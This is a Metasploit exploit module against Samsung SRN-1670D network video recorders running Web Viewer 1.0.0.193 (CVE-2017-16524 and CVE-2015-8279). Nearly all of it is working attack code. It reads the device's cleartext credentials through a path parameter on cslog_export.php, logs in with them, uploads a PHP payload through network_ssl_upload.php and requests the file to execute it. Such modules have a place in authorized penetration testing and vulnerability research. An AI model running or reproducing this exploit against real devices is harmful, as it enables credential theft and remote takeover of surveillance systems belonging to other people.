##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'digest'

class MetasploitModule < Msf::Exploit::Remote
  	
  	Rank = GoodRanking
	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::PhpEXE

	def initialize(info = {})
	    super(update_info(info,
	      'Name'           => 'Samsung SRN-1670D - Web Viewer Version 1.0.0.193 Arbitrary File Read & Upload',
	      'Description'    => %q{
		This module exploits an Unrestricted file upload vulnerability in 
		Web Viewer 1.0.0.193 on Samsung SRN-1670D devices: 'network_ssl_upload.php' 
		allows remote authenticated attackers to upload and execute arbitrary
		PHP code via a filename with a .php extension, which is then accessed via a
		direct request to the file in the upload/ directory. 
		To authenticate for this attack, one can obtain web-interface credentials 
		in cleartext by leveraging the existing Local File Read Vulnerability 
		referenced as CVE-2015-8279, which allows remote attackers to read the 
		web interface credentials via a request for the
		cslog_export.php?path=/root/php_modules/lighttpd/sbin/userpw URI.
	      },

	      'Author'         => [
		'Omar Mezrag <omar.mezrag@realistic-security.com>',  # @_0xFFFFFF
	        'Realistic Security',
	        'Algeria'
	       ],
	      'License'        => MSF_LICENSE,
	      'References'     =>
	        [
	          [ 'CVE', '2017-16524' ],
	          [ 'URL', 'https://github.com/realistic-security/CVE-2017-16524' ],
	          [ 'CVE', '2015-8279' ],
	          [ 'URL', 'http://blog.emaze.net/2016/01/multiple-vulnerabilities-samsung-srn.html' ]
	        ],
	      'Privileged'     => true,
	      'Arch'           => ARCH_PHP,
	      'Platform'       => 'php',
	      'Targets'        =>
	        [
			['Samsung SRN-1670D == 1.0.0.193', {}]
	        ],
	      'DefaultTarget'  => 0,
	      'DisclosureDate' => 'Mar 14 2017'
	    ))

	    register_options(
	      [
	        OptString.new('RHOST', [ true, 'The target address.' ]),
		OptString.new('RPORT', [ true, 'The target port (TCP).', '80' ]),
	      ])
	end


	def check
		#
		print_status('Checking version...') 

	 	resp = send_request_cgi({
			'uri'     =>  "/index",
			'version' => '1.1',
			'method' => 'GET',
			'headers' =>
				{
				   'User-Agent' => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
				}
	        })
	    
		unless resp
			print_error("Connection timed out.")
			return Exploit::CheckCode::Unknown
		end
		#        <!---------------------------------   File Version 1.0.0.193   --------------------------------->
		version = nil
		if resp and resp.code == 200  and resp.body.match(/Web Viewer for Samsung NVR/)
				if resp.body =~ /File Version (\d+\.\d+\.\d+\.\d+)/
					version = $1
					if version == '1.0.0.193'
						print_good "Found vesrion: #{version}"
						return Exploit::CheckCode::Appears
					end
				end
		end

		Exploit::CheckCode::Safe

	end

  	def exploit

	 
		print_status('Obtaining credentails...') 
	 
	 	resp = send_request_cgi({
			'uri'     =>  "/cslog_export.php",
			'version' => '1.1',
			'method' => 'GET',
			'vars_get'=>
				{
				'path' => '/root/php_modules/lighttpd/sbin/userpw',
				'file' => 'foo'
				},
			'headers' =>
				{
				   'User-Agent' => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
				}
	        })
		
		unless resp
			print_error("Connection timed out.")
			return Exploit::CheckCode::Unknown
		end

		if resp and resp.code == 200 and resp.body !~ /Authentication is failed/ and resp.body !~ /File not found/
			username =  resp.body.split(':')[0]
			password =  resp.body.split(':')[1].gsub("\n",'')
			print_good "Credentials obtained successfully: #{username}:#{password}"
				

				data1 = Rex::Text.encode_base64("#{username}")
				data2 = Digest::SHA256.hexdigest("#{password}")

				randfloat  = Random.new
				data3 =  randfloat.rand(0.9)
				data4 = data3

				print_status('Logging...') 

			 	resp = send_request_cgi({
					'uri'     =>  "/login",
					'version' => '1.1',
					'method' => 'POST',
					'vars_post'=>
						{
							'data1' => data1,
							'data2' => data2,
							'data3' => data3,
							'data4' => data4
						},
					'headers' =>
						{
						   'User-Agent' => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
						   'DNT' => "1",
						   'Cookie' => "IESEVEN=1"
						}
				})

				unless resp
					print_error("Connection timed out.")
					return Exploit::CheckCode::Unknown
				end
				
				if resp and resp.code == 200  and resp.body !~ /ID incorrecte/  and resp.body =~ /setCookie\('NVR_DATA1/

					print_good('Authentication Succeeded') 

					nvr_d1 = $1 if resp.body =~ /setCookie\('NVR_DATA1', '(\d\.\d+)'/
					nvr_d2 = $1 if resp.body =~ /setCookie\('NVR_DATA2', '(\d+)'/
					nvr_d3 = $1 if resp.body =~ /setCookie\('NVR_DATA3', '(0x\h\h)'/
					nvr_d4 = $1 if resp.body =~ /setCookie\('NVR_DATA4', '(0x\h\h)'/
					nvr_d7 = $1 if resp.body =~ /setCookie\('NVR_DATA7', '(\d)'/
					nvr_d8 = $1 if resp.body =~ /setCookie\('NVR_DATA8', '(\d)'/
					nvr_d9 = $1 if resp.body =~ /setCookie\('NVR_DATA9', '(0x\h\h)'/

					cookie = "IESEVEN=1; NVR_DATA1=#{nvr_d1}; NVR_DATA2=#{nvr_d2}; NVR_DATA3=#{nvr_d3}; NVR_DATA4=#{nvr_d4}; NVR_DATA7=#{nvr_d7}; NVR_DATA8=#{nvr_d8}; NVR_DATA9=#{nvr_d9}"

					payload_name = "#{rand_text_alpha(8)}.php"

					print_status("Generating payload[ #{payload_name} ]...") 

					php_payload = get_write_exec_payload(:unlink_self=>true)
				
					print_status('Uploading payload...') 

					data = Rex::MIME::Message.new
					data.add_part("2", nil, nil, 'form-data; name="is_apply"')
					data.add_part("1", nil, nil, 'form-data; name="isInstall"')
					data.add_part("0", nil, nil, 'form-data; name="isCertFlag"')
					data.add_part(php_payload, 'application/x-httpd-php', nil, "form-data; name=\"attachFile\"; filename=\"#{payload_name}\"")
					post_data = data.to_s

					resp = send_request_cgi({

						'uri'      => normalize_uri('/network_ssl_upload.php'),
						'method'   => 'POST',
						'vars_get' => 
							{
							'lang' => 'en'
							},
						'headers' =>
							{
							   'User-Agent' => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
							},
						'ctype'    => "multipart/form-data; boundary=#{data.bound}",
						'cookie'   => cookie,
						'data'     => post_data

					    })

					unless resp
						print_error("Connection timed out.")
						return Exploit::CheckCode::Unknown
					end

					if resp and resp.code == 200 
						print_status('Executing payload...') 
						upload_uri = normalize_uri("/upload/" + payload_name)
						send_request_cgi({
							'uri'    => upload_uri,
							'method' => 'GET'
						},5)

						unless resp
							print_error("Connection timed out.")
							return Exploit::CheckCode::Unknown
						end

						if resp and resp.code != 200
							print_error("Failed to upload")
						end

					else
						print_error("Failed to upload")
					end
				else
					print_error("Authentication failed")
				end
			
		else
			print_error "Error obtaining credentails"
		end
	end
end
